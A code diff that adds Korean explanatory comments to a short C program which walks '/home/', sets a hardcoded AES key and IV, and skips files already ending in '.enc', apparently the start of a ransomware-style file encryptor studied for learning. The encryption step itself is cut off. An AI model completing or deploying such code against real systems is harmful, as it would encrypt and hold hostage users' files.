@@ -14,26 +14,26 @@ int main()
 {
    
 	
-	char* start_path;
-	start_path = "/home/";
+	char* start_path;										  //start_path라는 char형 포인터만듬
+	start_path = "/home/";  //그안에 /home/ 을 넣음
     ls_dir(start_path);
 
     return 0;
 }
 
-void ls_dir(char* start_path)
+void ls_dir(char* start_path)// ls_dir은 char형 포인터를 하나받아서 반환없음
 {
-	unsigned char key[] = "12345678901234561234567890123456";// 32 char 256bit key
-    unsigned char iv[] = "1234567890123456";//same size as block 16 char 128 bit block
+	unsigned char key[] = "12345678901234561234567890123456";	   // 32 char 256bit key 부호없는 char형 변수로 key배열 만들고 그안에 문자32개넣음
+    unsigned char iv[] = "1234567890123456";					   //same size as block 16 char 128 bit block 부호없는 char형 변수로 iv배열만들고 그안에 문자 16개넣음  
 
-	DIR* dir;
-	struct dirent *ent;
-	if((dir=opendir(start_path)) !=NULL)
+	DIR* dir;											   //dirent.h에 있는 dir구조체로 dir포인터 선언
+	struct dirent *ent;									   //*dirent 개방한 파일의 정보를 저장할 구조체 변수
+	if((dir=opendir(start_path)) !=NULL)					  //start_path(/home/)을 열고 dir에 넣는다 성공해서 NULL이 아닌값이 반환됬다면 if문진입
 	{
-		while((ent=readdir(dir)) !=NULL)
+		while((ent=readdir(dir)) !=NULL)					   //연 디렉토리를 읽어서 ent에 넣음
 		{
-			int len = strlen(ent->d_name);
-			const char* last_four = &ent->d_name[len-4];
+			int len = strlen(ent->d_name);				   //디렉토리의 이름의 길이 len에 저장
+			const char* last_four = &ent->d_name[len-4];		   //해당폴더의 
 			if(strcmp(last_four,".enc") != 0)
 			{
 				if(ent->d_type == 8)
